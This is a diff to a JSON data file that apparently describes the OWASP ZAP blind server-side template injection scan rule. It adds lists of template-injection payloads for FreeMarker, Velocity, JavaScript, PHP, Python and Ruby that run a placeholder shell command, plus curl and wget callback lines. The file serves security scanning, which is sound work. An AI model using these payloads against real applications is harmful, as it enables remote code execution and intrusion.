@@ -14,8 +14,45 @@
     "OWASP_2017_A01": "",
     "WSTG_V42_INPV_18_SSTI": ""
   },
-  "payloads": [],
+  "payloads": [
+    "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"X_COMMAND_X\") }",
+    "#set($engine=\"\")\n",
+    "#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"X_COMMAND_X\"))\n",
+    "#set($null=$proc.waitFor())\n",
+    "${null}"
+  ],
   "patterns": [],
+  "all_arrays": {
+    "JAVA_COMMAND_EXEC_PAYLOADS": [
+      "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"X_COMMAND_X\") }",
+      "#set($engine=\"\")\n",
+      "#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"X_COMMAND_X\"))\n",
+      "#set($null=$proc.waitFor())\n",
+      "${null}"
+    ],
+    "JAVASCRIPT_COMMAND_EXEC_PAYLOADS": [
+      "{{= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString() }}",
+      "<%= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()%>",
+      "#{global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()}",
+      "{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()\\\")\")()}}"
+    ],
+    "PHP_COMMAND_EXEC_PAYLOADS": [
+      "{system(\"X_COMMAND_X\")}"
+    ],
+    "PYTHON_COMMAND_EXEC_PAYLOADS": [
+      "{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"X_COMMAND_X\")}}",
+      "${__import__(\"subprocess\").check_output(\"X_COMMAND_X\", shell=True)}",
+      "{{__import__(\"subprocess\").check_output(\"X_COMMAND_X\", shell=True)}}"
+    ],
+    "RUBY_COMMAND_EXEC_PAYLOADS": [
+      "<%=%x(X_COMMAND_X)%>",
+      "#{%x(X_COMMAND_X)}"
+    ],
+    "WAYS_TO_MAKE_HTTP_REQUESTS_CMD_LINE": [
+      "curl X_URL_X",
+      "wget X_URL_X"
+    ]
+  },
   "raw_class": "org.zaproxy.zap.extension.ascanrules.SstiBlindScanRule",
   "passive": false
 }
